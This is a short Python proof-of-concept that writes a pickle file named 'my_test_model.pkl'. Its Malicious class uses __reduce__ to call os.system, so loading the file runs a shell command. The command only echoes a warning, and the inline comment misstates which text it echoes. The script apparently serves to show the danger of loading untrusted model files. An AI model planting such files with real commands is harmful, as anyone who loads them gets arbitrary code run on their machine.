import pickle
import os

class Malicious:
    def __reduce__(self):
        # This tells Python: "When you open me, run 'echo Hello World'"
        return (os.system, ("echo 'This model is insecure!'",))

with open("my_test_model.pkl", "wb") as f:
    pickle.dump(Malicious(), f)
